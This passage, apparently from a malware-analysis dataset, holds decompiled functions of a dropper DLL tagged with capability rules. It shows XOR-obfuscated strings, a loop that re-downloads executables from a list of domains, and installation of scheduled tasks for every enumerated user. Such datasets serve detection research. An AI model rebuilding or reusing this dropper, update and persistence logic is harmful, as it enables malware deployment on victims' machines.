uVar13 = 0;\n                do {\n                    puVar1 = uVar13 + var_28h;\n                    uVar9 = uVar13 & 0x80000007;\n                    if (uVar9 < 0) {\n                        uVar9 = (uVar9 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar13 = uVar13 + 1;\n                    *puVar1 = *(&var_8h + uVar9) ^ puVar1[&var_70h - var_28h];\n                } while (uVar13 < 0x43);\n                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x23c);\n                var_a0h = 0xc;\n                var_98h = 0;\n                var_9ch = 0;\n                iVar12 = (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)\n                                   (iVar6, 1, &var_9ch, 0);\n                if (iVar12 == 0) {\n                    uVar7 = 0x23f;\n                    pcVar16 = \n                    \"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : Initialization of default security attributes failed.\"\n                    ;\n                    goto code_r0x00405c4c;\n                }\n            }\n            else {\n                var_18h = 0x6440b1b;\n                var_14h._0_1_ = 0x20;\n                var_14h._1_1_ = 0x6b;\n                var_14h._2_2_ = 0x655;\n                var_10h._0_2_ = 0x5766;\n                var_10h._2_2_ = 0x5770;\n                var_ch._0_2_ = 0x391c;\n                var_ch._2_2_ = 0x3161;\n                var_8h = 0x4b6c3148;\n                var_4h = var_4h & 0xff000000 | 0x6e506c;\n                fcn.00401000(0x10);\n                iVar6 = var_28h;\n                iVar12 = 0;\n                do {\n                    puVar1 = iVar12 + var_28h;\n                    iVar10 = iVar12 % var_2ch;\n                    iVar12 = iVar12 + 1;\n                    *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_18h - var_28h];\n                } while (iVar12 < 0x10);\n                fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x234);\n                var_a0h = 0xc;\n                var_98h = 0;\n                var_9ch = 0;\n                iVar12 = (*_sym.imp.ADVAPI32.dll_ConvertStringSecurityDescriptorToSecurityDescriptorA)\n                                   (iVar6, 1, &var_9ch, 0);\n                if (iVar12 == 0) {\n                    uVar7 = 0x237;\n                    pcVar16 = \n                    \"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : Initialization of low security attributes failed.\"\n                    ;\ncode_r0x00405c4c:\n                    fcn.00403bde(pcVar16, uVar7);\n                }\n            }\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            goto code_r0x00405c62;\n        }\n        uVar7 = 0x22d;\n        pcVar16 = \"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : Failed generating machine-level names.\";\n    }\n    fcn.00403bde(pcVar16, uVar7);\ncode_r0x00405c62:\n    *0x427d10 = fcn.004056c3();\n    pcVar3 = _sym.imp.KERNEL32.dll_GlobalFindAtomW;\n    *0x427d10 = *0x427d10 & 0xffff;\n    iVar4 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomW)(*0x427d24);\n    pcVar2 = _sym.imp.KERNEL32.dll_FindAtomW;\n    if ((iVar4 != 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_FindAtomW)(*0x427d24),  iVar4 != 0)) {\n        var_24h = fcn.0040ece8();\n        if (var_24h == 0) {\n            var_24h = fcn.0040ece8();\n        }\n        fcn.0040eb11();\n        fcn.0040eb11();\n        uVar5 = (*pcVar3)(*0x427d24);\n        (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar5);\n        uVar5 = (*pcVar2)(*0x427d24);\n        (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar5);\n    }\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x25;\n    var_14h._2_2_ = 0x555a;\n    var_10h._0_2_ = 0x1b05;\n    var_10h._2_2_ = 0xa0f;\n    var_ch._0_2_ = 0x3234;\n    var_8h = 0x3032466f;\n    var_4h = var_4h & 0xff000000 | 0x636e61;\n    fcn.00401000(10);\n    iVar6 = var_28h;\n    iVar12 = 0;\n    do {\n        puVar1 = iVar12 + var_28h;\n        iVar10 = iVar12 % var_2ch;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_14h - var_28h];\n    } while (iVar12 < 10);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x254);\n    var_18h = 0x18083640;\n    var_14h._0_1_ = 0x17;\n    var_14h._2_2_ = 0x527;\n    var_10h._0_2_ = 0x275d;\n    var_10h._2_2_ = 0x204;\n    var_ch._0_2_ = 0x661e;\n    var_14h._1_1_ = 7;\n    var_8h = 0x76694233;\n    var_4h = 0x6a4b6673;\n    fcn.00401000(0xe);\n    uVar13 = 0;\n    do {\n        puVar1 = uVar13 + var_74h;\n        uVar9 = uVar13 & 0x80000007;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xfffffff8) + 1;\n        }\n        uVar13 = uVar13 + 1;\n        *puVar1 = *(&var_8h + uVar9) ^ puVar1[&var_18h - var_74h];\n    } while (uVar13 < 0xe);\n    pcVar15 = \"standalonemtm_EncryptedStackedBuffer\";\n    uVar7 = 0x255;\n    pcVar16 = \"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\";\n    iVar10 = var_74h;\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x255);\n    pcVar2 = _sym.imp.USER32.dll_wsprintfA;\n    iVar12 = var_24h;\n    if (var_24h == 0) {\n        iVar12 = *0x427a50;\n    }\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_e8h, \"%s_%d\", iVar6, iVar12, pcVar16, uVar7, pcVar15, iVar10);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : VendorString : %s\", 0x25a);\n    *0x427d44 = fcn.0040d0df();\n    *0x427d10 = 6000;\n    (*pcVar2)(&var_128h, 0x41459c, 6000);\n    var_8h = 0xf1632;\n    var_4h = CONCAT31(var_4h._1_3_, 0x61);\n    var_24h = 0x657a6446;\n    var_20h._0_2_ = 0x3561;\n    var_20h._2_1_ = 0x37;\n    fcn.00401000(5);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + var_78h;\n        iVar12 = iVar6 % var_2ch;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_24h + iVar12) ^ puVar1[&var_8h - var_78h];\n    } while (iVar6 < 5);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x261);\n    var_14h._0_1_ = 0x19;\n    var_14h._1_1_ = 0x29;\n    var_14h._2_2_ = 0xb0d;\n    var_10h._0_2_ = 0x1f09;\n    var_10h._2_2_ = 0x30d;\n    var_ch._0_2_ = 0x4c0b;\n    var_8h = 0x6f634c6f;\n    var_4h = 0x6a526d66;\n    fcn.00401000(10);\n    uVar13 = 0;\n    do {\n        puVar1 = uVar13 + var_24h;\n        uVar9 = uVar13 & 0x80000007;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xfffffff8) + 1;\n        }\n        uVar13 = uVar13 + 1;\n        *puVar1 = *(&var_8h + uVar9) ^ puVar1[&var_14h - var_24h];\n    } while (uVar13 < 10);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x262);\n    var_1ch = 0xa2e513f;\n    var_18h = 0x29271105;\n    var_14h._0_1_ = 0x37;\n    var_14h._1_1_ = 0x43;\n    var_14h._2_2_ = 0xb34;\n    var_10h._0_2_ = 0x603;\n    var_10h._2_2_ = 0x383a;\n    var_ch._0_2_ = 0x543b;\n    var_ch._2_2_ = 0x6422;\n    var_8h = 0x64473052;\n    var_4h = 0x4a486375;\n    fcn.00401000(0x14);\n    iVar6 = var_2ch;\n    uVar13 = 0;\n    do {\n        puVar1 = uVar13 + var_2ch;\n        uVar9 = uVar13 & 0x80000007;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xfffffff8) + 1;\n        }\n        uVar13 = uVar13 + 1;\n        *puVar1 = *(&var_8h + uVar9) ^ puVar1[&var_1ch - var_2ch];\n    } while (uVar13 < 0x14);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x263);\n    var_90h = 0x21225908;\n    var_8ch = 0xf3d2a22;\n    var_88h = 0x2b294c29;\n    var_84h = 0x1203281d;\n    var_80h = 0x203f5918;\n    var_7ch._0_1_ = 0x4d;\n    var_10h._0_2_ = 0x385a;\n    var_10h._2_2_ = 0x454c;\n    var_ch._0_2_ = 0x474d;\n    var_ch._2_2_ = 0x6671;\n    fcn.00401000(0x15);\n    iVar12 = var_4h;\n    uVar13 = 0;\n    do {\n        puVar1 = uVar13 + var_4h;\n        uVar9 = uVar13 & 0x80000007;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xfffffff8) + 1;\n        }\n        uVar13 = uVar13 + 1;\n        *puVar1 = *(&var_10h + uVar9) ^ puVar1[&var_90h - var_4h];\n    } while (uVar13 < 0x15);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : decrypt (char) %s -> %s\", 0x264);\n    pcVar2 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_74h, var_78h);\n    (*pcVar2)(var_24h, &var_e8h);\n    (*pcVar2)(iVar6, 0x427a54);\n    (*pcVar2)(iVar12, &var_128h);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    puVar14 = puVar8;\n    for (iVar6 = 0xc; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar8 = 0x20;\n    *0x427d34 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_CreateThread;\n    *0x427cd0 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00401246, puVar8, 0, 0);\n    *0x427cd4 = (*pcVar2)(0, 0, fcn.00406543, *0x427d40, 0, 0);\n    *0x427cd8 = (*pcVar2)(0, 0, fcn.004038dc, puVar8, 0, 0);\n    uVar7 = (*pcVar2)(0, 0, fcn.0040eac6, arg_8h, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar7);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > ServiceEntryPointThread : ServiceEntryPointThread <<<\", 0x278);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar12);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar3)(0, var_2ch);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_24h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_78h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_74h);\n    (*pcVar2)(uVar7);\n    uVar7 = (*pcVar3)(0, var_28h);\n    (*pcVar2)(uVar7);\n    return 0;\n}\n",
        "token_count": 5976
    },
    "0040621d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040621d(void)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    uint *puVar8;\n    uint *puVar9;\n    char *pcVar10;\n    uint uVar11;\n    char *pcVar12;\n    uint lpWSAData;\n    uint s;\n    uint ARG_0;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    char *var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    uint var_1ah;\n    uint var_16h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    char *var_4h;\n    \n    var_48h = *0x427aa0;\n    var_34h = *0x427ccc;\n    puVar8 = \"abcdefghijklmnopqrstuvwxyz.-_1234567890\";\n    puVar9 = &s;\n    for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_3ch = 7;\n    var_2ch = 0;\n    var_30h = 0x427910;\n    do {\n        pcVar7 = var_30h;\n        var_38h = 0;\n        var_28h = 0;\n        bVar2 = true;\n        iVar4 = 0;\n        do {\n            if ((pcVar7[var_2ch] != '\\0') && (iVar3 = (*_sym.imp.ntdll.dll_strchr)(&s, pcVar7[var_2ch]),  iVar3 == 0)) {\n                bVar2 = false;\n                break;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x20);\n        fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : CurrentDomain : %p (cheack at debugger), bDomainNameCheckPassed = %d\"\n                     , 0x96);\n        if (((*pcVar7 != '\\0') && (pcVar7[0x1f] == '\\0')) && (bVar2)) {\n            var_20h._0_1_ = 0x67;\n            stack0xffffffde = 0x23052226;\n            puVar8 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_1ah = 0x62013b24;\n            puVar8 = &var_8h;\n            for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_20h._1_1_ = 7;\n            var_16h = 0x4d345268;\n            var_10h = 0x47567548;\n            var_ch._0_2_ = 0x5077;\n            var_ch._2_1_ = 0x4d;\n            fcn.00401000(0xe);\n            pcVar7 = var_30h;\n            iVar4 = var_44h;\n            iVar3 = 0;\n            do {\n                puVar1 = iVar3 + var_44h;\n                iVar5 = iVar3 % var_3ch;\n                iVar3 = iVar3 + 1;\n                *puVar1 = *(&var_10h + iVar5) ^ puVar1[&var_20h - var_44h];\n            } while (iVar3 < 0xe);\n            pcVar12 = \"szRpersists4Template_EncryptedStackedBuffer\";\n            uVar11 = 0xa1;\n            pcVar10 = \"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : decrypt (char) %s -> %s\";\n            iVar3 = var_44h;\n            fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : decrypt (char) %s -> %s\", 0xa1);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar4, var_48h, pcVar10, uVar11, pcVar12, iVar3);\n            fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : request for dropper update, local hash : %d\"\n                         , 0xa8);\n            fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : DropperFileRequest : %s\", 0xa9);\n            iVar3 = fcn.0040461b(0, &ARG_0, &var_28h, &var_38h);\n            fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : ContentLength=%d, DropperFileUpdate.cbData=%d\"\n                         , 0xb5);\n            if (iVar3 == 0) {\n                if (var_28h == 0) {\n                    fcn.0040cff1();\n                    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n                    break;\n                }\n                if (var_8h < var_28h) {\n                    fcn.0040cff1();\n                    var_34h = var_34h * 0x19660d + 0x3c6ef35f;\n                    uVar6 = var_34h % 600000;\n                    fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : sleep for %d milliseconds\", \n                                 200);\n                    (*_sym.imp.KERNEL32.dll_Sleep)(uVar6 + 60000);\n                }\n                else if (((4 < var_28h) && (var_28h == var_8h)) &&\n                        ((var_4h != NULL && ((*var_4h == 'M' && (var_4h[1] == 'Z')))))) {\n                    fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > ReDownloadServiceDllFile : new file downloaded!, DropperFileUpdate.cbData : %d bytes\"\n                                 , 0xd4);\n                    fcn.0040cf9a();\n                    fcn.0040cff1();\n                    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n                    break;\n                }\n            }\n            uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n        }\n        var_30h = pcVar7 + 0x20;\n        var_2ch = var_2ch + 1;\n    } while (var_30h < 0x427a50);\n    return *var_24h != 0;\n}\n",
        "token_count": 1764
    },
    "00406543": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004065c5)\n// WARNING: Removing unreachable block (ram,0x004065e8)\n// WARNING: Removing unreachable block (ram,0x004065f5)\n// WARNING: Removing unreachable block (ram,0x0040661f)\n// WARNING: Removing unreachable block (ram,0x00406624)\n// WARNING: Removing unreachable block (ram,0x0040664f)\n// WARNING: Removing unreachable block (ram,0x00406653)\n// WARNING: Removing unreachable block (ram,0x0040666a)\n// WARNING: Removing unreachable block (ram,0x00406690)\n\nuint __cdecl fcn.00406543(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint uVar3;\n    \n    puVar2 = 0x427d2c;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > DLLFileUpdateThread : <<<\", 0x118);\n    fcn.0040611c();\n    fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > DLLFileUpdateThread : file readed, enter update loop\", 0x11e);\n    while (*0x427df4 == 0) {\n        if (*0x427aa0 == 0) {\n            uVar3 = 0x32;\n        }\n        else {\n            iVar1 = fcn.0040621d();\n            if (iVar1 != 0) {\n                fcn.0040cff1();\n            }\n            fcn.00403bde(\"GTK DLL: droppperfile.cpp:%d > DLLFileUpdateThread : sleep for %d milliseconds\", 0x168);\n            uVar3 = 5000;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 465
    },
    "00406713": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406713(uint param_1, uchar *param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint noname_0;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    code *pcVar10;\n    char *pcVar11;\n    char *pcVar12;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint32_t var_98h;\n    uchar *ARG_0;\n    int32_t var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6fh;\n    uint var_6bh;\n    uint var_67h;\n    uint var_63h;\n    uint var_5fh;\n    uint var_5bh;\n    uint var_57h;\n    uint var_53h;\n    uint var_4fh;\n    uint var_4bh;\n    uint var_47h;\n    uint var_43h;\n    int32_t var_3fh;\n    uchar *pszFirst;\n    uint32_t var_34h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_17h;\n    uint var_13h;\n    uint var_fh;\n    uint var_bh;\n    uint var_4h;\n    \n    var_30h = NULL;\n    var_a0h = 0;\n    var_a4h = 0;\n    var_98h = 0;\n    ARG_0 = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pszFirst = puVar3;\n    fcn.0040790a();\n    if (puVar3 == NULL) {\n        fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : ExpandedEnvString : Allocation failed\"\n                     , 0x22);\n    }\n    else {\n        var_8ch = 0x6427764f;\n        var_88h = 0x6a033724;\n        var_84h = 0x74256632;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        var_80h = 0x762b5363;\n        var_7ch = 0x37286443;\n        var_78h = 0x661f6a1e;\n        var_34h = 7;\n        var_74h._0_1_ = 7;\n        stack0xffffff89 = 0x5534574;\n        var_6fh = 0x1b641576;\n        var_6bh = 0x26a3537;\n        var_67h = 0x7e743866;\n        var_63h = 0x12760453;\n        var_5fh = 0x21371164;\n        var_5bh = 0x166186a;\n        var_57h = 0x4a534374;\n        var_53h = 0xc642376;\n        var_4fh = 0x1a6a2337;\n        var_4bh = 0x45740b66;\n        var_47h = 0x14760f53;\n        var_43h = 0x53372864;\n        var_3fh._0_1_ = 0x6a;\n        var_2ch = 0x6466766a;\n        var_28h._0_2_ = 0x3774;\n        var_28h._2_1_ = 0x53;\n        fcn.00401000(0x9c);\n        iVar5 = var_9ch;\n        iVar9 = 0;\n        do {\n            puVar1 = iVar9 + var_9ch;\n            iVar6 = iVar9 % var_34h;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_2ch + iVar6) ^ puVar1[&var_8ch - var_9ch];\n        } while (iVar9 < 0x4e);\n        fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : decrypt (wide char) %s -> %ws\"\n                     , 0x28);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar5, pszFirst, 0x104);\n        var_24h = 0x5a01623b;\n        var_20h = 0x481b4c44;\n        var_1ch = 0x37377807;\n        _var_18h = 0x623a6f3c;\n        stack0xffffffe8 = 0x4c515a17;\n        stack0xffffffec = 0x780e4806;\n        var_fh._3_1_ = 0x3f;\n        var_bh._0_1_ = 0x37;\n        var_bh._1_1_ = 0x4c;\n        var_bh._2_1_ = 0x6f;\n        stack0xfffffff4 = 0x5a786248;\n        var_4h = CONCAT13(var_4h._3_1_, 0x6f4c37);\n        fcn.00401000(0x38);\n        iVar5 = stack0xffffffc0;\n        iVar9 = 0;\n        do {\n            puVar1 = iVar9 + stack0xffffffc0;\n            iVar6 = iVar9 % var_34h;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_bh + iVar6 + 3) ^ puVar1[&var_24h - stack0xffffffc0];\n        } while (iVar9 < 0x1c);\n        fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : decrypt (wide char) %s -> %ws\"\n                     , 0x2c);\n        puVar3 = pszFirst;\n        iVar5 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar5);\n        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar5 != 0) {\n            var_20h = 0x55335171;\n            var_1ch = 0x623b6234;\n            _var_18h = 0x55335110;\n            stack0xffffffe8 = 0x622a6230;\n            stack0xffffffec = 0x552e5171;\n            var_fh._3_1_ = 100;\n            var_bh._0_1_ = 0x62;\n            stack0xfffffff4 = 0x55725154;\n            var_4h = 0x626b6264;\n            fcn.00401000(0x2c);\n            iVar5 = var_2ch;\n            uVar7 = 0;\n            do {\n                puVar1 = uVar7 + var_2ch;\n                uVar4 = uVar7 & 0x80000007;\n                if (uVar4 < 0) {\n                    uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                }\n                uVar7 = uVar7 + 1;\n                *puVar1 = *(&var_bh + uVar4 + 3) ^ puVar1[&var_20h - var_2ch];\n            } while (uVar7 < 0x16);\n            fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : decrypt (wide char) %s -> %ws\"\n                         , 0x2e);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar5, puVar3, 0x104);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar3, *0x427d28);\n        fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : szFullDllName : %ws\"\n                     , 0x35);\n        iVar5 = fcn.0040720d(ARG_0);\n        if (iVar5 == 0) {\n            fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : FILE SAVED\", \n                         0x3c);\n            fcn.00406db9();\n            do {\n                iVar5 = (*_sym.imp.NETAPI32.dll_NetUserEnum)\n                                  (0, 0, 2, &var_30h, 0xffffffff, &var_98h, &var_a0h, &var_a4h);\n                var_2ch = iVar5;\n                if ((iVar5 == 0) || (iVar5 == 0xea)) {\n                    if (var_30h != NULL) {\n                        var_34h = 0;\n                        puVar8 = var_30h;\n                        if (var_98h != 0) {\n                            do {\n                                if (puVar8 == NULL) {\n                                    fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : An access violation has occurred\"\n                                                 , 0x51);\n                                    iVar5 = var_2ch;\n                                    break;\n                                }\n                                fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : \\t-- %ws\"\n                                             , 0x55);\n                                uVar2 = (*pcVar10)(0, 0x208);\n                                ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (ARG_0 != NULL) {\n                                    stack0xffffffe8 = 0x3826365c;\n                                    stack0xffffffec = 0x7a553169;\n                                    var_fh._3_1_ = 10;\n                                    var_bh._0_1_ = 0x36;\n                                    var_bh._1_1_ = 0x55;\n                                    var_bh._2_1_ = 0x38;\n                                    puVar3 = ARG_0;\n                                    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                        *puVar3 = 0;\n                                        puVar3 = puVar3 + 1;\n                                    }\n                                    stack0xfffffff4 = 0x38553679;\n                                    var_4h = 0x7a703136;\n                                    fcn.00401000(0x18);\n                                    iVar5 = var_90h;\n                                    uVar7 = 0;\n                                    do {\n                                        puVar1 = uVar7 + var_90h;\n                                        uVar4 = uVar7 & 0x80000007;\n                                        if (uVar4 < 0) {\n                                            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n                                        }\n                                        uVar7 = uVar7 + 1;\n                                        *puVar1 = *(&var_bh + uVar4 + 3) ^ puVar1[&var_17h + (3 - var_90h)];\n                                    } while (uVar7 < 0xc);\n                                    pcVar12 = \"wszLss_EncryptedStackedBuffer\";\n                                    uVar2 = 0x5c;\n                                    pcVar11 = \n                                    \"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : decrypt (wide char) %s -> %ws\"\n                                    ;\n                                    iVar9 = var_90h;\n                                    fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : decrypt (wide char) %s -> %ws\"\n                                                 , 0x5c);\n                                    puVar3 = ARG_0;\n                                    (*_sym.imp.USER32.dll_wsprintfW)\n                                              (ARG_0, iVar5, *puVar8, *0x427d24, pcVar11, uVar2, pcVar12, iVar9);\n                                    fcn.00403bde(\"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : RandomSvcName : %ws\"\n                                                 , 0x61);\n                                    iVar9 = fcn.0040d8b3(noname_0, *puVar8);\n                                    if (iVar9 == 0) {\n                                        uVar2 = 0x6f;\n                                        pcVar11 = \n                                        \"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : Sheduled for (%ws) task NOT created\"\n                                        ;\n                                    }\n                                    else {\n                                        uVar2 = 0x6a;\n                                        pcVar11 = \n                                        \"GTK DLL: exe_scheduler_install.cpp:%d > ExeInstallDllAsSheduledTaskAndStart : Sheduled for (%ws) task created\"\n                                        ;\n                                    }\n                                    fcn.00403bde(pcVar11, 